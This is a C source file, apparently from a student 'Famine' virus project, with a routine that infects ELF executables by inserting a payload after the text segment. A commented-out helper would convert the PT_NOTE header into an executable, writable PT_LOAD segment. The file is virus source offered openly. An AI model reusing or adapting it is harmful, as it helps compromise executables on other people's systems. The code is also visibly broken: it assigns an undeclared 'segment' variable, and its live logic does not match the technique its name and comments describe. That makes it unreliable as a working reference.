/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   pt_note_to_pt_load_infection.c                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mabouce <ma.sithis@gmail.com>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/09/23 18:04:56 by mabouce           #+#    #+#             */
/*   Updated: 2021/09/23 18:04:56 by mabouce          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

// static inline void update_note_segment(struct s_info *info)
// {
//     const size_t base = info->data->p_vaddr + info->data->p_memsz;
//     const size_t add_padding = base % info->data->p_align;

//     info->note->p_vaddr = base + (info->data->p_align - add_padding);
//     info->note->p_paddr = info->note->p_vaddr;
//     info->note->p_offset = base - add_padding;

//     info->note->p_filesz = PAYLOAD_SIZE;
//     info->note->p_memsz = PAYLOAD_SIZE;

//     info->note->p_type = PT_LOAD;
//     info->note->p_flags = (PF_X | PF_W | PF_R);
//     info->note->p_align = info->data->p_align;
// }

void pt_note_to_pt_load_infection(t_famine *famine)
{
    // Create the output file
    if (!(famine->infected_file = malloc(famine->binary_data_size + PAGE_SIZE)))
    {
        error(ERROR_MALLOC, famine);
    }
    famine->infected_file_size = famine->binary_data_size + PAGE_SIZE;

    for (size_t i = 0; i < famine->ehdr->e_phnum; i++)
    {
        if (is_data_segment(famine->phdr[i]) == true)
            famine->p_data = segment;
        if (is_note_segment(famine->phdr[i]) == true)
            famine->p_note = segment;
    }

    if (!famine->p_note || !famine->p_data)
    {
        error(ERROR_SECTION_NOT_FOUND, famine);
    }
    // update_note_segment(info);

    // Copy until text section end
    memcpy(famine->infected_file, famine->mmap_ptr, famine->text_p_end_offset);
    // Initialize value to zero for padding.
    bzero(famine->infected_file + famine->text_p_end_offset, PAGE_SIZE);
    // Insert payload after text section end
    memcpy(famine->infected_file + famine->text_p_end_offset, famine->payload_data, famine->payload_size);
    // Insert rest of binary
    memcpy(famine->infected_file + famine->text_p_end_offset + PAGE_SIZE, famine->mmap_ptr + famine->text_p_end_offset, famine->binary_data_size - famine->text_p_end_offset);
}
